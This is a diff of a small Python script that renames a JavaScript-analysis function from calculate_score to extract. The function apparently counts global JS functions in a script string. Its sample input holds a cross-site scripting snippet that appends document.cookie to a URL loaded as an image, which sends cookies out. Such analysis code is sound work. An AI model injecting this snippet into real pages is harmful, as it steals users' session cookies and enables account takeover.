@@ -1,7 +1,7 @@
 import re
 
 
-def calculate_score(js_content: str) -> int:
+def extract(js_content: str) -> int:
     # 定义全局函数和正则表达式
     functions = [
         "parseInt",
@@ -30,5 +30,5 @@ if __name__ == "__main__":
     url = url + encodeURI(document.cookie);
     document.getElementById("pic").src=url;</script>
     """
-    res = calculate_score(js_content)
+    res = extract(js_content)
     print(f"js global functions count:{res}")
